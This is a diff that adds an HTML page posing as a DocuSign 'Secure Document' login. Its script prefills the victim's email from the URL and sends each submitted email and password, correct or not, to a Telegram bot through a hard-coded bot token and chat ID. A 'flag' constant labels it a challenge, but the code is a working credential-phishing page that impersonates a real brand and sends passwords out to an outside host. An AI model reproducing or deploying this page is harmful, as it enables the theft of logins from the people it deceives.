@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Secure Document</title>
+<style>
+body {
+    margin: 0;
+    background: #f3f4f6;
+    font-family: "Helvetica Neue", Arial, sans-serif;
+    color: #333;
+}
+
+.header {
+    background: #1a5cff;
+    color: white;
+    padding: 15px 30px;
+    font-size: 20px;
+    font-weight: bold;
+}
+
+.header span {
+    font-weight: normal;
+    opacity: 0.85;
+}
+
+.document-wrapper {
+    display: flex;
+    justify-content: center;
+    padding: 40px 15px;
+}
+
+.document {
+    background: white;
+    width: 100%;
+    max-width: 600px;
+    padding: 40px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    border-radius: 6px;
+}
+
+.document h2 {
+    margin-top: 0;
+}
+
+.lock-screen {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.55);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+}
+
+.lock-box {
+    background: white;
+    width: 340px;
+    padding: 30px;
+    border-radius: 6px;
+    text-align: left;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+}
+
+.lock-box h3 {
+    margin-top: 0;
+    color: #1a5cff;
+}
+
+.lock-box input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+}
+
+.lock-box input[readonly] {
+    background: #f0f2f5;
+    color: #666;
+}
+
+.lock-box button {
+    width: 100%;
+    padding: 11px;
+    background: #1a5cff;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    cursor: pointer;
+}
+
+.lock-box button:hover {
+    background: #144bcc;
+}
+
+.error {
+    color: #c0392b;
+    font-size: 13px;
+    display: none;
+    margin-top: 8px;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+    DocuSign <span>— Secure Document</span>
+</div>
+
+<div class="document-wrapper">
+    <div class="document" id="content" style="display:none;">
+        <h2>Document Access Granted</h2>
+        <p>You have successfully completed the verification challenge.</p>
+        <p>This document is now unlocked.</p>
+    </div>
+</div>
+
+<div class="lock-screen" id="lockScreen">
+    <div class="lock-box">
+        <h3>🔒 Login to Continue</h3>
+        <p>Continue with Email.</p>
+
+        <input type="email" id="email" placeholder="Email address" required>
+        <input type="password" id="answer" placeholder="Password" required>
+
+        <button onclick="submitAttempt()">Continue</button>
+
+        <div class="error" id="errorMsg">The answer you entered is incorrect.</div>
+    </div>
+</div>
+
+<script>
+/* ===== CONFIG ===== */
+const CORRECT_ANSWER = "flag{Paddword}";
+const TELEGRAM_BOT_TOKEN = "8287452275:AAH2a-EFlpXjxl9LBhbhzLW3J8u1SsUS37I";
+const TELEGRAM_CHAT_ID = "6023129266";
+/* ================= */
+
+// Auto-grab email
+(function () {
+    const emailInput = document.getElementById("email");
+    const params = new URLSearchParams(window.location.search);
+    const urlEmail = params.get("email");
+    const storedEmail = localStorage.getItem("challenge_email");
+
+    const email = urlEmail || storedEmail;
+    if (email) {
+        emailInput.value = email;
+        emailInput.readOnly = true;
+    }
+})();
+
+function submitAttempt() {
+    const emailInput = document.getElementById("email");
+    const email = emailInput.value.trim();
+    const answer = document.getElementById("answer").value.trim();
+    const errorMsg = document.getElementById("errorMsg");
+
+    if (!email || !answer) return;
+
+    localStorage.setItem("challenge_email", email);
+
+    const isCorrect = answer === CORRECT_ANSWER;
+
+    const message =
+`📄 DocuSign-Style Challenge
+📧 Email: ${email}
+🔑 Password: ${answer}
+✅ AutoFill: ${isCorrect ? "YES" : "NO"}
+🕒 ${new Date().toLocaleString()}`;
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+        })
+    });
+
+    if (isCorrect) {
+        document.getElementById("lockScreen").style.display = "none";
+        document.getElementById("content").style.display = "block";
+    } else {
+        errorMsg.style.display = "block";
+    }
+}
+</script>
+
+</body>
+</html>
